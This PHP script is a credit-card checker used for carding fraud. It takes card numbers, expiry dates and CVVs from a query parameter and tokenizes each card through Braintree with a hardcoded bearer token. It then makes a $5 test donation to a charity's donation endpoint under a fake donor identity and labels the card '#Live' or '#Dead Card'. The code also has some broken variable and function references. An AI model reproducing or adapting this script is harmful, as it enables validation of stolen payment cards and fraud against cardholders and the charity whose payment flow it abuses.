<?php

error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
	$one = str_replace($delimiters, $delimiters[0], $string);
	$two = explode($delimiters[0], $one);
	return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];



function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}



/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: payments.braintree-api.com',
   'Authorization: Bearer 3108ea7e746f29992279c0bacd4a1621750e8d97d8daa290eaeae09f144ad92c|created_at=2019-12-04T05:20:28.511925408+0000&merchant_id=qps48ycgcvpgvn8w&public_key=qhrjnqjy5xbsr65w',
   'Braintree-Version: 2018-05-10',
   'Content-Type: application/json',
   'Origin: https://assets.braintreegateway.com',
   'Referer: https://assets.braintreegateway.com/web/3.42.0/html/hosted-fields-frame.min.html'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"3dc1a0e3-e82c-48b1-bf2e-55003c0c0a16"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$b_pago = curl_exec($ch);

$toks = json_decode($b_pago, true);
$token = $okst['data']['tokenizeCreditCard']['token'];
$card = trim(strip_tags(getstr($b_pago,'"prepaid":"','productId"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://us-central1-go-donate-production.cloudfunctions.net/submitPayment');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: text/plain',
'Origin: https://donate.orbis.org',
'Referer: https://donate.orbis.org/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  '{"amount":5,"firstname":"Deadsec","lastname":"DeadMan","email":"deadsecdeadman@gmail.com","address1":"121 Madison Ave Ofc 1","address2":"","county":"NY","city":"New York","country":"United States","postcode":"10016","nonce":"'.$token.'","currency":"USD","customfields":"{\"campaign\":\"\",\"medium\":\"\",\"source\":\"\",\"state\":\"NY\",\"OptInEmail\":false,\"tellUsWhy\":\"\",\"coverFees\":false,\"coverFeesAmount\":\"\"}"}');
$b_pago = curl_exec($ch);
$mes = json_decode($b_pago, true);
$message = trim(strip_tags(getstr($b_pago,'"message":"','"')));
if(strpos($b_pago, 'Thank you.') !== false) {
  echo '<span class="badge badge-success">#Live</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>'.$bin.'</b>';
} else {
 echo $mes;
  echo '<span class="badge badge-danger">#Dead Card</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' '.$card.' <b>'.$b_pago.'</b>';
}
curl_close($ch);
ob_flush();
?>